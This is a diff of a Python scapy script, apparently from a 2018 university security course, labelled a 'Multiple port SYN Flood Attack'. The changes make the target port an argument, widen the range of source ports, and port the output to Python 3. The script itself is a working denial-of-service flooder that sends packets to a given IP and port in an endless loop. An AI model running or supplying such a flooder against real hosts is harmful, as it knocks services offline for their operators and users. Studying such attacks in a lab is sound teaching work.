@@ -1,12 +1,18 @@
 #! /usr/bin/env python
 
+# Security in Computer Systems 2018 - SDU.
+# Multiple port SYN Flood Attack.
+# @CarlosViescasHuerta.
+
 import sys
 from scapy.all import *
 
 # Establish source and target IPs from input arguments
 src_ip = sys.argv[1]
 dst_ip = sys.argv[2]
-dst_port = 5000
+dst_port = int(sys.argv[3])
+
+print ("Launching DoS to http://" + dst_ip + ":" + str(dst_port))
 
 # Set counter
 i = 0
@@ -16,7 +22,7 @@ try:
     while True:
 
         # Flood from multiple ports 
-        for port in range(5001, 30000):
+        for port in range(5001, 50000):
 
             i = i + 1 
             # Set addresses and send packets
@@ -26,10 +32,9 @@ try:
             send(packet, inter = .001)
       
             # Print & Update
-            print "Port: " + str(port) + ". Sent packet # " + str(i)
+            print ("Port: " + str(port) + ". Sent packet # " + str(i))
 
 except KeyboardInterrupt:
 
     print ("\n \n \n \n \n \n \n \n \n \n \n")
-    print ("DOS interrupted.")
-      
+    print ("SYN Flood interrupted. Total packets sent: " + str(i))
